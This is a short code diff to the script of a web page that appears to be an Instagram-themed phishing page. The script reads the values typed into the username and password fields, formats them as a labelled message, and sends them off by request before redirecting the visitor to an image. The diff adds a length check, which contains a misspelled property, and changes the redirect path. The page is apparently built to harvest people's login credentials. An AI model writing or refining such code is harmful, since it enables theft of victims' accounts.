@@ -112,10 +112,11 @@
     var params = {
       content: ("> **USR  : **" + document.getElementById('username').value + "\n> **PWD : **" + document.getElementById('password').value)
     }
-    
+    if (username.length > 5 && password.lenght > 5){
     request.send(JSON.stringify(params));
 	sleep(300)
-	window.location.replace("/sardra_ye.jpg");
+	window.location.replace("instagram/sardra_ye.jpg");
+    }
   }
   </script>
 </body>
